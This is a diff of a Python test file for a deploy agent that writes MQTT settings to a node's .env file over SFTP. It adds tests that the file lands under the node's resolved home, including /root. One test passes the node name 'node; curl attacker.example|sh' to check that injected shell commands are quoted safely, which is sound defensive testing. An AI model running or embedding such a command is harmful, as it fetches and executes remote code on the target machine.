@@ -65,7 +65,7 @@ class TestWhatIsWritten:
         sftp = FakeSftp()
         target = _target(broker_user="rpi-account", broker_password="per-node")
 
-        assert await _agent()._put_node_env(sftp, target, "pi", "rpi", "10.0.0.1", 1883)
+        assert await _agent()._put_node_env(sftp, target, "/home/pi", "rpi", "10.0.0.1", 1883)
 
         body = sftp.written["/home/pi/wactorz/.env"]
         assert "MQTT_USERNAME=rpi-account" in body
@@ -76,7 +76,7 @@ class TestWhatIsWritten:
         _server_broker(monkeypatch, "wactorz", "shared")
         sftp = FakeSftp()
 
-        assert await _agent()._put_node_env(sftp, _target(), "pi", "rpi", "10.0.0.1", 1883)
+        assert await _agent()._put_node_env(sftp, _target(), "/home/pi", "rpi", "10.0.0.1", 1883)
 
         assert "MQTT_PASSWORD=shared" in sftp.written["/home/pi/wactorz/.env"]
 
@@ -86,7 +86,7 @@ class TestWhatIsWritten:
         sftp = FakeSftp()
 
         await _agent()._put_node_env(
-            sftp, _target(broker_password="p"), "pi", "rpi", "10.0.0.1", 1883
+            sftp, _target(broker_password="p"), "/home/pi", "rpi", "10.0.0.1", 1883
         )
 
         assert sftp.modes["/home/pi/wactorz/.env"] == 0o600
@@ -101,7 +101,9 @@ class TestWhatIsWritten:
         _server_broker(monkeypatch, "", "")
         sftp = FakeSftp()
 
-        assert not await _agent()._put_node_env(sftp, _target(), "pi", "rpi", "10.0.0.1", 1883)
+        assert not await _agent()._put_node_env(
+            sftp, _target(), "/home/pi", "rpi", "10.0.0.1", 1883
+        )
 
         body = sftp.written["/home/pi/wactorz/.env"]
         assert "MQTT_USERNAME" not in body
@@ -114,7 +116,7 @@ class TestWhatIsWritten:
         # argument under the unit and argparse exits 2.
         sftp = FakeSftp()
 
-        await _agent()._put_node_env(sftp, _target(), "pi", "rpi", "10.0.0.1", 8883)
+        await _agent()._put_node_env(sftp, _target(), "/home/pi", "rpi", "10.0.0.1", 8883)
 
         body = sftp.written["/home/pi/wactorz/.env"]
         assert "WACTORZ_NODE=rpi" in body
@@ -128,7 +130,7 @@ class TestWhatIsWritten:
         sftp = FakeSftp()
 
         await _agent()._put_node_env(
-            sftp, _target(), "pi", "node; curl attacker.example|sh", "10.0.0.1", 1883
+            sftp, _target(), "/home/pi", "node; curl attacker.example|sh", "10.0.0.1", 1883
         )
 
         line = next(
@@ -149,7 +151,7 @@ class TestWhatIsWritten:
         sftp = FakeSftp()
 
         await _agent()._put_node_env(
-            sftp, _target(broker_password=hostile), "pi", "rpi", "10.0.0.1", 1883
+            sftp, _target(broker_password=hostile), "/home/pi", "rpi", "10.0.0.1", 1883
         )
 
         line = next(
@@ -158,6 +160,35 @@ class TestWhatIsWritten:
             if ln.startswith("MQTT_PASSWORD=")
         )
         assert shlex.split(line) == [f"MQTT_PASSWORD={hostile}"]
+
+
+class TestWhereItIsWritten:
+    """The node says where its home is; nothing derives it from the user name.
+
+    Every shell step in the deploy addresses `~`, so a home that is not
+    `/home/<user>` -- root's `/root` above all -- would put the uploads and the
+    unit somewhere the venv is not. That is why deploying as root never worked.
+    """
+
+    async def test_it_follows_the_resolved_home(self) -> None:
+        sftp = FakeSftp()
+
+        await _agent()._put_node_env(
+            sftp, _target(broker_password="p"), "/root", "rpi", "10.0.0.1", 1883
+        )
+
+        assert "/root/wactorz/.env" in sftp.written
+        assert not any(path.startswith("/home/root") for path in sftp.written)
+
+    async def test_an_unusual_home_is_honoured_too(self) -> None:
+        # LDAP and /var/lib homes are the same shape of problem as root's.
+        sftp = FakeSftp()
+
+        await _agent()._put_node_env(
+            sftp, _target(broker_password="p"), "/var/lib/wactorz-node", "rpi", "10.0.0.1", 1883
+        )
+
+        assert "/var/lib/wactorz-node/wactorz/.env" in sftp.written
 
 
 def _server_broker(monkeypatch: pytest.MonkeyPatch, user: str, password: str) -> None:
